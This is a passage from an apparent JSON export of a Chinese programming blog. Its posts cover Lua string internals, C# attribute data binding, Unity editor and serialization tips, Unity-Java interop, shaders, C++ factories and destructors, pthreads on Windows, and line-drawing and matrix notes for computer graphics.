0 ]; } 创建字符串时，先通过缓冲查找，可以避免一些重复字符串的创建。 创建字符串。 /* ** new string (with explicit length) */ TString * luaS_newlstr ( lua_State * L , const char * str , size_t l ) { //根据字符串长度来创建 if ( l <= LUAI_MAXSHORTLEN ) /* short string? */ return internshrstr ( L , str , l ); //创建短字符串 else { TString * ts ; if ( l >= ( MAX_SIZE - sizeof ( TString )) / sizeof ( char )) luaM_toobig ( L ); ts = luaS_createlngstrobj ( L , l ); //创建长字符串 memcpy ( getstr ( ts ), str , l * sizeof ( char )); return ts ; } } 长字符串的创建 TString * luaS_createlngstrobj ( lua_State * L , size_t l ) { //长字符串在创建时，并没有计算哈希值，要作为索引用的时候才哈希 TString * ts = createstrobj ( L , l , LUA_TLNGSTR , G ( L ) -> seed ); ts -> u . lnglen = l ; return ts ; } 短字符串创建 /* ** checks whether short string exists and reuses it or creates a new one */ static TString * internshrstr ( lua_State * L , const char * str , size_t l ) { TString * ts ; global_State * g = G ( L ); unsigned int h = luaS_hash ( str , l , g -> seed ); TString ** list = & g -> strt . hash [ lmod ( h , g -> strt . size )]; lua_assert ( str != NULL ); /* otherwise 'memcmp'/'memcpy' are undefined */ //先从列表中找，找到后直接返回 for ( ts = * list ; ts != NULL ; ts = ts -> u . hnext ) { if ( l == ts -> shrlen && ( memcmp ( str , getstr ( ts ), l * sizeof ( char )) == 0 )) { /* found! */ if ( isdead ( g , ts )) /* dead (but not collected yet)? */ changewhite ( ts ); /* resurrect it */ return ts ; } } //如果元素的个数太多了，就要重新生成散列桶 if ( g -> strt . nuse >= g -> strt . size && g -> strt . size <= MAX_INT / 2 ) { luaS_resize ( L , g -> strt . size * 2 ); list = & g -> strt . hash [ lmod ( h , g -> strt . size )]; /* recompute with new size */ } //申请内存并创建结构体，组织方式： |TString结构体|l+1长的buff| ts = createstrobj ( L , l , LUA_TSHRSTR , h ); memcpy ( getstr ( ts ), str , l * sizeof ( char )); ts -> shrlen = cast_byte ( l ); ts -> u . hnext = * list ; * list = ts ; g -> strt . nuse ++ ; return ts ; } 通用创建过程： 可以发现，长字符串和短字符串都是通过 createstrobj 函数来创建的。 /* ** creates a new string object */ static TString * createstrobj ( lua_State * L , size_t l , int tag , unsigned int h ) { TString * ts ; GCObject * o ; size_t totalsize ; /* total size of TString object */ ////totalsize = sizeof(TString) + l + 1, 多加的1为了存储\\0 totalsize = sizelstring ( l ); o = luaC_newobj ( L , tag , totalsize ); ts = gco2ts ( o ); ts -> hash = h ; ts -> extra = 0 ; getstr ( ts )[ l ] = '\\0' ; /* ending 0 */ return ts ; } 短字符串的删除 void luaS_remove ( lua_State * L , TString * ts ) { stringtable * tb = & G ( L ) -> strt ; TString ** p = & tb -> hash [ lmod ( ts -> hash , tb -> size )]; while ( * p != ts ) /* find previous element */ p = & ( * p ) -> u . hnext ; //直接从列表里摘出来，并不释放 * p = ( * p ) -> u . hnext ; /* remove element from its list */ tb -> nuse -- ; } 字符串比较 Lua中使用 luaV_equalobj 来比较两个对象： /* ** Main operation for equality of Lua values; return 't1 == t2'. ** L == NULL means raw equality (no metamethods) */ int luaV_equalobj ( lua_State * L , const TValue * t1 , const TValue * t2 ) { ... /* values have same type and same variant */ switch ( ttype ( t1 )) { ... case LUA_TSHRSTR : return eqshrstr ( tsvalue ( t1 ), tsvalue ( t2 )); case LUA_TLNGSTR : return luaS_eqlngstr ( tsvalue ( t1 ), tsvalue ( t2 )); ... } ... } 对于短字符串： /* ** equality for short strings, which are always internalized */ #define eqshrstr(a,b) check_exp((a)->tt == LUA_TSHRSTR, (a) == (b)) 直接判断他们的地址是否相同。 对于长字符串 /* ** equality for long strings */ int luaS_eqlngstr ( TString * a , TString * b ) { size_t len = a -> u . lnglen ; lua_assert ( a -> tt == LUA_TLNGSTR && b -> tt == LUA_TLNGSTR ); return ( a == b ) || /* same instance or... */ (( len == b -> u . lnglen ) && /* equal length and ... */ //先比较长度可以加快判断 ( memcmp ( getstr ( a ), getstr ( b ), len ) == 0 )); /* equal contents */ } 相等的条件是：地址相同或者内容相同。","tags":"lua源码阅读","url":"http://www.vmetu.com/blog/luayuan-ma-yue-du-2-string.html","loc":"http://www.vmetu.com/blog/luayuan-ma-yue-du-2-string.html"},{"title":"一种利用C# Attribute实现数据的绑定","text":"一种利用C# Attribute实现数据的绑定 在日常开发中，经常会有数据和UI绑定的需求，即数据发生改变时，UI要随之改变。这里提供一个简单的思路，目的是尽量减少代码的编写。 ModelBase 数据存储基类 using System.Collections ; using System ; using System.Reflection ; using System.Collections.Generic ; [AttributeUsage(AttributeTargets.Property, Inherited = false)] public class ObservableName : Attribute { public string name = String . Empty ; public ObservableName ( string bindName ) { name = bindName ; } } public class ModelBase { public class ModelBindingInfo { public PropertyInfo propertyInfo = null ; public ArrayList callbacks = new ArrayList (); } private Dictionary < string , ModelBase . ModelBindingInfo > _bindingTable = new Dictionary < string , ModelBase . ModelBindingInfo >(); public ModelBase () { collectObservableProperty (); } private void collectObservableProperty () { _bindingTable . Clear (); Type type = this . GetType (); PropertyInfo [] propertyInfos = type . GetProperties (); for ( int i = 0 ; i < propertyInfos . Length ; i ++) { object [] obs = propertyInfos [ i ]. GetCustomAttributes ( false ); for ( int j = 0 ; j < obs . Length ; j ++) { ObservableName obName = obs [ j ] as ObservableName ; if ( obName != null && ! _bindingTable . ContainsKey ( obName . name )) { ModelBase . ModelBindingInfo bindingInfo = new ModelBase . ModelBindingInfo (); bindingInfo . propertyInfo = propertyInfos [ i ]; _bindingTable [ obName . name ] = bindingInfo ; } } } } public void addObserverBinding < T >( string obName , Action < T > cb ) { if ( _bindingTable . ContainsKey ( obName )) { _bindingTable [ obName ]. callbacks . Add ( cb ); } } public void removeObserverBinding < T >( string obName , Action < T > cb ) { if ( _bindingTable . ContainsKey ( obName )) { ArrayList callbacks = _bindingTable [ obName ]. callbacks ; callbacks . Remove ( cb ); } } public void setObservableData < T >( string obName , T data ) { if (! _bindingTable . ContainsKey ( obName )) { return ; } ModelBindingInfo bindingInfo = _bindingTable [ obName ]; bindingInfo . propertyInfo . SetValue ( this , data , null ); T newData = ( T ) bindingInfo . propertyInfo . GetValue ( this , null ); //通知 ArrayList callbacks = _bindingTable [ obName ]. callbacks ; for ( int j = 0 ; j < callbacks . Count ; j ++) { Action < T > cb = ( Action < T >) callbacks [ j ]; cb ( newData ); } } } 使用： 如果model中的某个property要被绑定，那么就加上 ObservableName 的属性，指定绑定的key， 然后就可以通过 addObserverBinding 来绑定行为了。 class Person : ModelBase { [ObservableName(\"address\")] public string address { get ; set ; } } class Test { public void testAttribute () { Person zhangwen = new Person (); zhangwen . addObserverBinding < string >( \"address\" , onZhangwenAddrChange ); Person shazi = new Person (); shazi . addObserverBinding < string >( \"address\" , onShaziAddrChange ); zhangwen . setObservableData ( \"address\" , \"caifugang\" ); shazi . setObservableData ( \"address\" , \"baijin\" ); } private void onShaziAddrChange ( string obj ) { Console . WriteLine ( \"shazi's addr changed, new addr: \" + obj ); } private void onZhangwenAddrChange ( string obj ) { Console . WriteLine ( \"zhangwen's addr changed, new addr: \" + obj ); } static void Main ( string [] args ) { TestAttribute test = new TestAttribute (); test . testAttribute (); Console . ReadKey (); } }","tags":"编程语言","url":"http://www.vmetu.com/blog/yi-chong-li-yong-c-attributeshi-xian-shu-ju-de-bang-ding.html","loc":"http://www.vmetu.com/blog/yi-chong-li-yong-c-attributeshi-xian-shu-ju-de-bang-ding.html"},{"title":"USheet API说明","text":"USheet API 说明 USheet API说明 USheet API 说明 查询相关 根据表的内容查找行号 查找某个单元格的内容 查找所有符合条件的行 根据行号获取行内容 删除相关 删除一列 删除一行 修改相关 修改单元格数据 修改列名 最新源码： https://github.com/shazi129/USheet.git 名字空间：USheet 注意： 如果需要使修改后的数据落地，需要调用 EditorUtility.SetDirty(sheetData); 查询相关 根据表的内容查找行号 int indexOf<T>(string title, T value, int startIndex = 0) 参数： title: 索引列的表头 Value: 索引列的值 startIndex: 查找的起始行号 返回： 从0开始的行号 查找某个单元格的内容 IGridData getValue<T>(string keyName, T keyValue, string title, int index = 0) 参数： keyName: 索引列的表头 keyValue: 索引列的值 title: 单元格所在的列表头 index : 查找的起始行号 返回： 单元格内容结构体，没查到返回null 查找所有符合条件的行 List<Dictionary<string, IGridData>> getRows<T>(string keyName, T keyValue) 参数： keyName: 索引列的表头 keyValue: 索引列的值 返回： 所有的行内容，没查到返回null。其中 Dictionary<string, IGridData> 代表一行的内容，key为列名， IGridData为数据 根据行号获取行内容 Dictionary<string, IGridData> getRow(int index) 参数： index: 行号 返回： 所有的行内容，没查到返回null。在返回的Dictionary中，key为列名， IGridData为数据 删除相关 删除一列 void deleteColumn(string columnName) 参数： columnName: 列名 删除一行 void deleteRow(int index = -1) 参数： index : 行号，小于0时删除最后一行 修改相关 修改单元格数据 void modify(string title, int rowIndex, IGridData iData) 参数： title: 列名 rowIndex: 行号 iData: 需要修改成的数据 修改列名 void modifyColumnName(string oldName, string newName) 参数： oldName: 要修改的列名 newName: 新的列名","tags":"编程语言","url":"http://www.vmetu.com/blog/usheet-apishuo-ming.html","loc":"http://www.vmetu.com/blog/usheet-apishuo-ming.html"},{"title":"使用ScriptableObject序列化Unity Object","text":"在Unity中，Unity Object的序列化必须依赖GameObject。像这样是不行的： [ Serializable ] class ObjectSheetData : SheetData { public Object data = null ; } ObjectSheetData objData = new ObjectSheetData (); objData . data = 某个 Sprite ; //序列化到data.byte BinaryFormatter formatter = new BinaryFormatter (); Stream stream = new FileStream ( \"data.byte\" , FileMode . Create , FileAccess . Write , FileShare . None ); formatter . Serialize ( stream , objData ); stream . Close (); Unity会提示 SerializationException: Type UnityEngine.Sprite is not marked as Serializable. 通常的做法是将要序列化的数据附加到一个GameObject上，然后将GameObject做成Prefab，在要使用数据的地方引用Prefab就可以了。这里提供一个算是比较通用的 脚本 ，用来实现类似表的功能。 但我们发现这是一种 数据附加到界面上来存储 的方式，有违 界面与数据分离 的设计方式。 ScriptableObject 提供了一种不依赖 GameObject 的序列化数据的方式。 我们可以将数据封装成这样： public class ScriptableData : ScriptableObject { public string myName = \"\"; public int myLevel = 0; public Sprite myIcon = null; } 提供一个创建数据文件的接口： [MenuItem(\"ScriptableTest/CreateData\")] public static void CallFunc() { ScriptableData data = ScriptableObject.CreateInstance<ScriptableData>(); data.myName = \"\"; data.myLevel = 0; data.myIcon = null; //ScriptableDataPaht是数据文件的路径 AssetDatabase.CreateAsset(data, GlobalValue.ScriptableDataPaht); AssetDatabase.SaveAssets(); } 创建出来的文件是这样子的： 填上数据后，就可以在运行时读取了： ScriptableData _data = AssetDatabase.LoadAssetAtPath<ScriptableData>(GlobalValue.ScriptableDataPaht); nameInput.text = _data.myName; levelInput.text = _data.myLevel.ToString(); image.sprite = _data.myIcon;","tags":"Unity","url":"http://www.vmetu.com/blog/shi-yong-scriptableobjectxu-lie-hua-unity-object.html","loc":"http://www.vmetu.com/blog/shi-yong-scriptableobjectxu-lie-hua-unity-object.html"},{"title":"Unity Editor 自定义窗口","text":"Unity Editor 自定义窗口 示例代码 API解析 GetWindow OnGUI() focusedWindow和mouseOverWindow OnInspectorUpdate() Repaint Unity 提供 EditorWindow 给开发者使得开发者可以创建自定义的编辑器界面，像这样的： 下面来深入了解一下。 示例代码 public class MyWindow : EditorWindow { [ MenuItem ( \"Window/MyWindow\" )] static void myWindow () //创建自定义窗口 { MyWindow window = ( MyWindow ) EditorWindow . GetWindow ( typeof ( MyWindow )); window . Show (); } private void OnGUI () //构建界面 { string focuseName = focusedWindow == null ? \"Nothing\" : focusedWindow . ToString (); string overName = mouseOverWindow == null ? \"Nothing\" : mouseOverWindow . ToString (); GUILayout . Label ( \"Focus Win:\" + focuseName + \", Mouse over:\" + overName ); } void OnInspectorUpdate () //实时更新 { this . Repaint (); } } API解析 GetWindow 函数原型： public static EditorWindow GetWindow ( Type t , bool utility = false , string title = null , bool focus = true ); 这个函数的作用是返回当前Uinty界面上的第一个类型为 t 的窗口，如果没有，创建并返回。 参数utility如果为true，那么这个窗口始终是一个浮动窗口，不会和其他窗口组合。 OnGUI() 自定义窗口的UI实现 focusedWindow 和 mouseOverWindow 这是EditorWindow中的两个自定义变量： public static EditorWindow mouseOverWindow; public static EditorWindow focusedWindow; 表示当前Unity界面中，焦点窗口和鼠标Over窗口，可为Null。 OnInspectorUpdate() 这个函数每秒会被调用10次，用来实时更新自定义窗口的信息。 在我们的示例程序中，因为要实时监听鼠标的Over事件和窗口的focus事件，所以需要这个函数。 Repaint 重新绘制窗口","tags":"计算机图形学","url":"http://www.vmetu.com/blog/unity-editor-zi-ding-yi-chuang-kou.html","loc":"http://www.vmetu.com/blog/unity-editor-zi-ding-yi-chuang-kou.html"},{"title":"一些Unity控件","text":"tab控件 用于快速生成有tab页的界面，可动态生成 id-object的map 经常用于在程序中配置id和图片的对应关系 MoveForSpecialDev 用于不同设备的界面元素位置的微调，目前仅用于iPhoneX的适配","tags":"Unity","url":"http://www.vmetu.com/blog/yi-xie-unitykong-jian.html","loc":"http://www.vmetu.com/blog/yi-xie-unitykong-jian.html"},{"title":"Unity下C#与Java的交互(一)","text":"Unity下C#与Java的交互(一) 1. 创建Android工程 2. 编写java代码并导出 3. 编写C#代码 打Android包运行 更改AndroidManifest 这种情况主要发生在Unity要使用Android代码的情况下。Unity提供的方式是将用到的Android代码打成jar文件，放到Unity的plugins文件中，然后使用。 示例用到的是utils.jar 1. 创建Android工程 创建一个Android工程，并导入Unity提供的jar，下面是我的示例： 其中， com.zw.utils 是要导出的包， com.zw.unity_test 是我用来测试jar包的代码，class.jar是导入的unity提供的jar包。 2. 编写java代码并导出 这里先实现一个小功能： public class Utils { public static int addOne ( int a ){ return a + 1 ; } } 右击 com.zw.utils 导出jar： 并将utils.jar放到Unity的 Asset/Plugins/Android/bin 目录下 3. 编写C#代码 public class TestAndroid : MonoBehaviour { private Button selfBtn ; public Text selfText ; public Text outText ; private int a = 0 ; // Use this for initialization void Start () { selfBtn = gameObject . GetComponent < Button > (); selfBtn . onClick . AddListener ( onSelfBtnClick ); } private void onSelfBtnClick () { try { # if UNITY_ANDROID AndroidJavaClass jClass = new AndroidJavaClass ( \"com.zw.utils.Utils\" ); a = jClass . CallStatic < int > ( \"addOne\" , a ); # endif selfText . text = \"\" + a ; } catch ( Exception e ) { outText . text = e . ToString (); } } } Unity界面 button上的text显示java代码返回的结果，另一个text显示错误信息。 打Android包运行 更改AndroidManifest 当我们在android中加入了一些需要权限的代码，例如读取sd卡数据。有两种方法，一是在Unity的Player Setting中设置这个： 二是更改AndroidManifest.xml Unity在打apk包时，会以： 为模版来修改，那我们要做的，就是将这个xml复制到 Asset/Plugins/Android/ 下，然后加入权限申明就可以了。 其他略","tags":"编程语言","url":"http://www.vmetu.com/blog/unityxia-cyu-javade-jiao-hu-yi.html","loc":"http://www.vmetu.com/blog/unityxia-cyu-javade-jiao-hu-yi.html"},{"title":"Unity Shader 学习笔记1 —— 第一个Shader","text":"Unity Shader 学习笔记1—— 第一个Shader @(计算机图形学)[学习笔记, Unity, shader] Unity Shader 学习笔记1 —— 第一个Shader Unity Shader 学习笔记1—— 第一个Shader Shader结构 Properties SubShader 和 Fallback 一个示例 使用 Shader结构 Properties 示例： Properties{ _Color(\"Color Tint\", Color) = (1.0, 1.0, 1.0, 1.0) _Offset(\"Offset\", Vector) = (0, 0, 0, 0) } 类似于定义变量。例如_Color一行的含义为：Shader中有个 _Color 的变量，它的类型是 Color , 值由编辑器中的 Color Tint 来编辑。效果： SubShader 和 Fallback SubShader是Unity Shader用来支持不同显卡的方式。当Unity加载一个Shader时，会从这个Shader中选取第一个可以支持的SubShader加载，如果都不支持，使用FallBack指定的Shader SubShader中每个渲染流程可以用Pass包起来，一个SubShader中可以有多个渲染流程 一个示例 Shader \"Custom/1_shader\" { Properties { _Color ( \"Color Tint\" , Color ) = ( 1 . 0 , 1 . 0 , 1 . 0 , 1 . 0 ) _Offset ( \"Offset\" , Vector ) = ( 0 , 0 , 0 , 0 ) } SubShader { Pass { CGPROGRAM // 定义顶点着色器和片元着色器的代码 # pragma vertex vert # pragma fragment frag fixed4 _Color ; fixed4 _Offset ; float4 vert ( float4 v : POSITION ) : SV_POSITION { // 意思是将模型空间中的点转换为剪裁空间（屏幕）中的点，然后加上 offset return UnityObjectToClipPos ( v ) + _Offset ; } fixed4 frag () : SV_Target { return _Color ; } ENDCG } } } 使用 创建shader文件 在Unity Project中右击，选择 Create->Shader->Standard Surface Shader ，创建完成后改名，然后将自己的代码替换掉原来的代码。 创建Meterial 创建后，将Shader设为自己的Shader MeshRender使用 创建一个GameObject, 增加MeshRender组件，将材质设为刚才创建的材质，就可以看到效果了","tags":"计算机图形学","url":"http://www.vmetu.com/blog/unity-shader-xue-xi-bi-ji-1-di-yi-ge-shader.html","loc":"http://www.vmetu.com/blog/unity-shader-xue-xi-bi-ji-1-di-yi-ge-shader.html"},{"title":"一个C++实现类似反射的工厂模式","text":"@(编程语言)[C/C++] 目的：使用C++实现一个有类似反射功能的工厂类 头文件： #include <iostream> #include <string> #include <map> using namespace std ; class Base { public : virtual void print () { cout << \"this is class Base\" << endl ;} }; class DeriveA : public Base { public : virtual void print () { cout << \"this is class DeriveA\" << endl ;} }; class DeriveB : public Base { public : virtual void print () { cout << \"this is class DeriveB\" << endl ;} }; class Factory { public : static Factory * shareInstance (); ~ Factory (); template < typename T > T * getClass () { string keyName = string ( typeid ( T ). name ()); map < string , Base *>:: iterator iter = mClassMap . find ( keyName ); if ( iter != mClassMap . end ()) { T * retObj = dynamic_cast < T *> ( iter -> second ); if ( retObj ) { return retObj ; } } T * retObj = new T (); addClass ( keyName , retObj ); return retObj ; } private : Factory (); void addClass ( const string & key , Base * baseClass ); private : map < string , Base *> mClassMap ; }; 源文件 Factory :: Factory (){} Factory ::~ Factory (){} Factory * Factory :: shareInstance () { static Factory factory ; return & factory ; } void Factory :: addClass ( const string & key , Base * baseClass ) { map < string , Base *>:: iterator iter = mClassMap . find ( key ); if ( iter != mClassMap . end ()) { delete ( iter -> second ); mClassMap . erase ( iter ); } mClassMap [ key ] = baseClass ; } int main ( int argc , char ** argv ) { Factory :: shareInstance () -> getClass < DeriveA > () -> print (); Factory :: shareInstance () -> getClass < DeriveB > () -> print (); return 0 ; }","tags":"编程语言","url":"http://www.vmetu.com/blog/yi-ge-cshi-xian-lei-si-fan-she-de-gong-han-mo-shi.html","loc":"http://www.vmetu.com/blog/yi-ge-cshi-xian-lei-si-fan-she-de-gong-han-mo-shi.html"},{"title":"C++中未使用虚析构函数导致的内存泄漏","text":"代码 #include <vector> #include <iostream> #include \"vld.h\" using namespace std ; class Base { public : Base (){} ~ Base () { cout << \"Base Destructor\" << endl ; } }; class Derive : public Base { public : Derive () { vecInt . push_back ( 0 ); vecInt . push_back ( 2 ); } ~ Derive () { cout << \"Derive Destructor\" << endl ; } vector < int > vecInt ; }; int main ( int argc , char ** argv ) { Base * a = new Derive (); delete a ; return 0 ; } vld内存检查： Leak Hash: 0xFF7D4793, Count: 1, Total 8 bytes Call Stack (TID 7516): MSVCR100D.dll!operator new() e:\\program files (x86)\\microsoft visual studio 10.0\\vc\\include\\xmemory (36): TestPrj.exe!std::_Allocate () + 0x15 bytes e:\\program files (x86)\\microsoft visual studio 10.0\\vc\\include\\xmemory (187): TestPrj.exe!std::allocator ::allocate() + 0xB bytes e:\\program files (x86)\\microsoft visual studio 10.0\\vc\\include\\vector (442): TestPrj.exe!std::_Vector_val >::_Vector_val >() + 0xA bytes e:\\program files (x86)\\microsoft visual studio 10.0\\vc\\include\\vector (508): TestPrj.exe!std::vector >::vector >() f:\\workspace\\testprj\\testprj\\singletest\\virtualdestructor.cpp (25): TestPrj.exe!Derive::Derive() + 0x59 bytes f:\\workspace\\testprj\\testprj\\singletest\\virtualdestructor.cpp (40): TestPrj.exe!test_interface() + 0x2B bytes f:\\workspace\\testprj\\testprj\\main.cpp (6): TestPrj.exe!main() + 0xD bytes f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\crtexe.c (555): TestPrj.exe!__tmainCRTStartup() + 0x19 bytes f:\\dd\\vctools\\crt_bld\\self_x86\\crt\\src\\crtexe.c (371): TestPrj.exe!mainCRTStartup() kernel32.dll!BaseThreadInitThunk() + 0x12 bytes ntdll.dll!RtlInitializeExceptionChain() + 0x63 bytes ntdll.dll!RtlInitializeExceptionChain() + 0x36 bytes Data: D8 4C 48 00 00 00 00 00 .LH..... ........ 因为基类的析构函数没有加virtual，delete的时候只会释放基类声明的内存块，子类的成员变量占用的内存就忽略了，导致内存泄漏。","tags":"编程语言","url":"http://www.vmetu.com/blog/czhong-wei-shi-yong-xu-xi-gou-han-shu-dao-zhi-de-nei-cun-xie-lou.html","loc":"http://www.vmetu.com/blog/czhong-wei-shi-yong-xu-xi-gou-han-shu-dao-zhi-de-nei-cun-xie-lou.html"},{"title":"Windows下使用pthreads库","text":"环境搭建 下载phtreads库： ftp://sourceware.org/pub/pthreads-win32/pthreads-w32-2-9-1-release.zip 使用 Pre-built.2/include 作为头文件引用 使用 Pre-built.2/lib/x86/pthreadVC2.lib 做为库文件引用 将 Pre-built.2/dll/x86/pthreadVC2.dll 考到生成exe的目录 测试代码： #include \"pthread.h\" #include <iostream> using namespace std ; void * Function_t ( void * Param ) { pthread_t myid = pthread_self (); cout << \"线程ID:\" << myid . x << endl ; return NULL ; } int test_interface ( int argc , char ** argv ) { pthread_t pid ; pthread_attr_t attr ; pthread_attr_init ( & attr ); pthread_attr_setscope ( & attr , PTHREAD_SCOPE_PROCESS ); pthread_attr_setdetachstate ( & attr , PTHREAD_CREATE_DETACHED ); cout << \"创建线程\" << endl ; pthread_create ( & pid , & attr , Function_t , NULL ); getchar (); pthread_attr_destroy ( & attr ); return 0 ; }","tags":"编程语言","url":"http://www.vmetu.com/blog/windowsxia-shi-yong-pthreadsku.html","loc":"http://www.vmetu.com/blog/windowsxia-shi-yong-pthreadsku.html"},{"title":"计算机图形学笔记——画直线算法","text":"计算机图形学笔记——画直线算法 @(计算机图形学)[学习笔记] 计算机图形学笔记——画直线算法 计算机图形学笔记——画直线算法 DDA算法 Bresenham算法 画线算法主要用来解决如下问题：对于某个直线方程，已知起点重点，计算机如何绘制出这个线段。计算机绘制线段其实就是绘制一系列的像素点。 DDA算法 思路: 对于直线方程 \\(y = kx + b\\) ， 在一个坐标轴以单位长度步进，并计算得到另一坐标轴的步进，之后根据起点+步进得到一个点的坐标，这个点就是需要绘制的点。为了保证绘制的精度，选择步进较大的坐标轴为基础坐标轴，例如每次步进​$\\Delta x > \\Delta y $, 那么以x轴为单位长度步进的坐标轴。 实现代码： //四舍五入 inline int round ( float a ) { return int ( a + 0.5f )} void lineDDA ( int startX , int startY , int endX , int endY ) { float dx = endX - startX ; float dy = endY - startY ; float steps = fabs ( dx ) > fabs ( dy ) ? fabs ( dx ) : fabs ( dy ); float incX = dx / steps ; float incY = dy / steps ; for ( int i = 0 ; i <= steps ; i ++ ) { float newX = ( float ) startX + ( float )( i ) * incX ; float newY = ( float ) startY + ( float )( i ) * incY ; drawPixel ( round ( newX ), round ( newY )); //画像素点 } } 通过代码也可以看到，运算使用了浮点运算,取整，不利于用硬件实现。 Bresenham算法 同DDA算法一样选择步进坐标轴，我们假设步进坐标轴为 \\(x\\) 轴，即斜率 \\(|k| < 1\\) , 因为绘制的像素点坐标必须是整数， 那么对于 \\((x_n, y_n)\\) 的下一个点 \\((x_{n+1}, y_{n+1})\\) ，有 \\(x_{n+1} = x_n + 1\\) , \\(y_{n+1} < 1\\) , 该点绘制的像素坐标会是 \\((x_n + 1, y_n)\\) ， \\((x_n + 1, y_n+1)\\) 中的一个。 每次绘制下一个点时，我们期望有这样一个变量 \\(p_n\\) , 如果 \\(p_n > 0\\) 下一个点的坐标为 \\((x_n + 1, y_n+1)\\) ，否则下一个点的坐标为 \\((x_n + 1, y_n)\\) 。 我们期望绘制的像素点离实际的坐标点距离越小越好，那么两个候选的像素坐标到实际坐标的距离分别为： \\(d_{upper}​\\) = \\(y_n+1 - y_{n+1}​\\) \\(d_{lower}​\\) = \\(y_{n+1} - y_n​\\) 对于直线方程 \\(y = kx + b\\) ： \\(\\Delta d = d_{lower} - d_{upper} = 2y_{n+1} - 2y_n -1 = 2(kx_{n+1} + b) - 2y_n -1\\) 其中 \\(x_{n+1} = x_n + 1​\\) , 推导可得： \\(\\Delta d = 2(kx_n - y_n) + 2k + 2b - 1​\\) 注意： 不能再继续用 \\(y_n = kx_n + b​\\) 代如上式推导下去了，因为点 \\((x_n, y_n)​\\) 不一定 精确地 在直线上。 如果 \\(\\Delta d > 0​\\) , 那么下个点取 \\((x_n + 1, y_n+1)​\\) 会准确一些，反之亦然，但 \\(\\Delta d​\\) 还不能作为变量 \\(p_n​\\) 使用，因为计算还存在浮点运算和除法。 到这一步的式子中，为了消除 \\(k\\) 这个存在除法运算的变量，我们可以用 \\(k = \\frac{X_{end} - X_{start}}{ Y_{end} - Y_{start}} = \\frac{\\Delta y}{\\Delta x}\\) 代如上式, 然后等式两边同时乘以 \\(\\Delta x\\) 可得： \\(\\Delta x \\Delta d = 2(\\Delta y x_n - \\Delta x y_n) + 2\\Delta y + 2b\\Delta x - \\Delta x = 2(\\Delta y x_n - \\Delta x y_n) + c​\\) 因为 \\(\\Delta x​\\) 在我们的设定中始终大于0， 这样我们就得到了需要的变量 \\(p_n = \\Delta x \\Delta d​\\) ，计算该变量无需浮点运算和除法。 进一步，我们可以通过 \\(p_n​\\) 和 \\(p_{n+1}​\\) 的关系来继续简化运算： \\(p_{n+1} - p_n = 2(\\Delta y(x_{n+1} - x_n) - \\Delta x(y_{n+1} - y_n)) = 2(\\Delta y - \\Delta x(y_{n+1} - y_n))​\\) 其中 \\(y_n+1\\) , \\(y_n\\) 是我们要话的两个像素点，它们的差为 \\(0\\) 或者 \\(-1\\) , 得到： $$p_{n+1} = \\begin{cases} p_n + 2\\Delta y &\\mbox{$p_n \\leq 0$} \\\\ p_n + 2(\\Delta y - \\Delta x) &\\mbox{$p_n > 0$} \\end{cases}​$$ 其中： \\(p_0 = 2(\\Delta y x_n - \\Delta x y_n) + c = 2(\\Delta y x_n - \\Delta x (\\frac{\\Delta y}{\\Delta x} x_0 + b)) + c = 2\\Delta y - \\Delta x​\\) 下面给出斜率 \\(|k| < 1\\) 的代码： void lineBresenham ( int startX , int startY , int endX , int endY ) { int x = startX ; int y = startY ; if ( x > endX ) //保证dx > 0 { x = endX ; endX = startX ; y = endY ; endY = startY ; } int dx = endX - x ; int dy = endY - y ; int p = 2 * dy - dx ; drawPixel ( x , y ); while ( x < endX ) { x ++ ; if ( p > 0 ) { y ++ ; p += 2 * ( dy - dx ); } else { p += 2 * dy ; } drawPixel ( x , y ); } } 当 \\(|k|>1\\) 时，选择y方向的步进即可，对于一些特殊斜率，如0， 1， 无穷大，直接使用特殊处理会更简单。","tags":"计算机图形学","url":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-hua-zhi-xian-suan-fa.html","loc":"http://www.vmetu.com/blog/ji-suan-ji-tu-xing-xue-bi-ji-hua-zhi-xian-suan-fa.html"},{"title":"计算机图形学笔记——矩阵","text":"计算机图形学笔记——矩阵 @(计算机图形学)[学习笔记] 计算机图形学笔记——矩阵 计算机图形学笔记——矩阵 矩阵与坐标变换 矩阵变换的应用 缩放 旋转 正交投影 镜像 平移与齐次坐标 矩阵的缺点 欧拉角 万向节运动 万向锁 插值计算 复数与旋转 四元数 在游戏编程过程中，如果要操作一个物体，我们会使用各种矩阵。下面来说一下这些矩阵是如何起作用的。 矩阵与坐标变换 在图像的绘制过程中，矩阵主要是用来进行坐标变换。我们先来看下面的推导。 要得到任意 坐标系1 中的某个点[a, b, c]，可以让原点先在x轴位移[a, 0, 0], 再在y轴上位移[0, b, 0]，最后在z轴上位移[0, 0, c]。将这三个方向的单位向量定义为 \\(p,q,r\\) , 可以得到推导中的(1)。 p,q,r是 坐标系2 中的某个向量，如推导中的(2) 计算后得到推导结果(4)，该结果就是 坐标系1 中的向量[a, b, c]在 坐标系2 中的表示 从最终的结果可以看出，将一个 坐标系1 中的向量变换到 坐标系2 中，只需要 右乘一个矩阵 即可。再看这个矩阵的内容，我们发现它的每一行就是 坐标系1 中的坐标轴方向的 单位向量 在 坐标系2 中的表示。 在二维笛卡尔坐标系下来看一下实例： 对于 物体坐标系 ，它的坐标轴的单位向量在 世界坐标系 中分别为：p=[2, 1], q=[-1, 2]： 那么对于物体坐标系中的某个点[1, 1]，变换到世界坐标系中为： $$\\begin{bmatrix} 1 & 1 \\end{bmatrix} \\begin{bmatrix} 2 & 1 \\\\ -1 & 2 \\end{bmatrix} = \\begin{bmatrix} 1 & 3 \\end{bmatrix}$$ 我们发现，从 物体坐标系 到 世界坐标系 的变换，是 物体坐标系 进行了 缩小 ，和 顺时针旋转 ， 但对于绘制出来的图像对于 世界坐标系 却是 放大 和 逆时针旋转 。在计算机绘制图形的时候，就是通过变换坐标系来进行图像的 缩放 和 旋转 的。 矩阵变换的应用 计算时，可以通过预先得出的变换矩阵来使流程简化。下面列一下各种变换矩阵。 缩放 二维与三维的缩放矩阵： 其中n为缩放方向，k为缩放因子。 旋转 二维坐标系中的绕圆心旋转和三维坐标系中绕某个向量旋转 正交投影 投影其实就是缩放。向某个平面投影，就是物体在该平面的法向量上的缩放为0。 镜像 镜像也是缩放。物体对于某个平面的镜像，就是该物品在平面法向量上的缩放为-1。例如在Unity2D中，如果将某个精灵的轴的缩放设为-1，那么会得到一个镜像精灵。 平移与齐次坐标 从上面的内容可知，将某一个向量平移，可以加上一个矩阵；将一个物体缩放或旋转，可以右乘一个矩阵： \\(p_1 = pM_1 + M_2\\) 